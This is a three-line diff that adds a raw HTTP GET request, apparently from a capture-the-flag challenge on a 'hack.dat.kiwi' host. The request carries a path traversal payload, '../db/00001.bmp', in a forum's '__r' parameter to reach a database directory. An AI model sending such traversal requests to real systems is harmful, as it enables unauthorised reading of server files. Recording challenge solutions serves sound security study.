@@ -1,0 +1,3 @@
+GET /web/kiwi-forum/?__r=../db/00001.bmp HTTP/1.1
+Host: 2edba7.hack.dat.kiwi
+
